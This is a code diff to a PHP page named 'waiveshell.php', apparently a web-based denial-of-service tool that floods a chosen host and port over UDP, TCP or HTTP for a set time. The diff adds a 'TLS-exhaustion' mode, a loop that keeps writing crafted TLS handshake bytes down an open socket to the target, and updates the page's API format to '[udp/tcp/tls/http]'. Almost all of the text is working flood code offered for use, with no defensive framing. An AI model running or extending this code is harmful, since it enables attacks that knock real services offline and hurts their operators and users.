@@ -40,6 +40,7 @@
         <select name="type" id="type">
             <option value="udp">UDP</option>
             <option value="tcp">TCP</option>
+            <option value="tls">TLS</option>
             <option value="http">HTTP</option>
         </select><br><br>
         <label for="host"><b>HOST</b></label><br>
@@ -66,6 +67,40 @@
         usleep(500000);
     }
 
+    function _tls($host, $port, $time) {
+        $start_time = microtime(true);
+        while ((microtime(true) - $start_time) < $time) {
+            try {
+                // generate 4 random hex bytes for padding
+                $bytes = random_bytes(4);
+                $hexadecimal = bin2hex($bytes);
+                $hex_with_prefix = '\x' . implode('\x', str_split($hexadecimal, 2));
+            
+                $data = "\x16\x03\x03$hex_with_prefix\x00\x00\x02\xc0\x2c\xc0\x30\x01\x00";
+                $socket = stream_socket_client($host . ':' . $port, $errno, $errstr, 30);
+                
+                // SSL wrap socket / hide warnings
+                @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
+                fwrite($socket, $data);
+                
+                // reuse to prevent TIME_WAIT local-socket exhaustion
+                while ((microtime(true) - $start_time) < $time) {
+                    $bytes = random_bytes(4);
+                    $hexadecimal = bin2hex($bytes);
+                    $hex_with_prefix = '\x' . implode('\x', str_split($hexadecimal, 2));
+                
+                    $data = "\x16\x03\x03$hex_with_prefix\x00\x00\x02\xc0\x2c\xc0\x30\x01\x00";
+                    fwrite($socket, $data);
+                }
+
+                fclose($socket);
+            } catch (Exception $e) {
+                // echo "An error occurred: " . $e->getMessage();
+            }
+        }
+        usleep(500000);
+    }
+    
     function _tcp($ip, $port, $time) {
         $start_time = microtime(true);
         while ((microtime(true) - $start_time) < $time) {
@@ -124,6 +159,9 @@
         } elseif (strtolower($type) === 'tcp') {
             echo "DISINTEGRATING " . $ip . ":" . $port . " VIA TCP FOR " . $time . " SECONDS";
             _tcp($ip, $port, $time);
+        } elseif (strtolower($type) === 'tls') {
+            echo "PULVERIZING " . $host . " VIA TLS-EXHAUSTION FOR " . $time . " SECONDS";
+            _tls($host, $port, $time);
         } elseif (strtolower($type) === 'http') {
             echo "VAPORIZING " . $host . " VIA HTTP FOR " . $time . " SECONDS";
             _http($ip, $host, $port, $time);
@@ -137,7 +175,7 @@
 </center>
 
 <footer>
-    API format:  <b>waiveshell.php?type=[udp/tcp/http]&host=[ip/domain]&port=[1-65535]&time=[seconds]</b>
+    API format:  <b>waiveshell.php?type=[udp/tcp/tls/http]&host=[ip/domain]&port=[1-65535]&time=[seconds]</b>
 </footer>
 </body>
 </html>
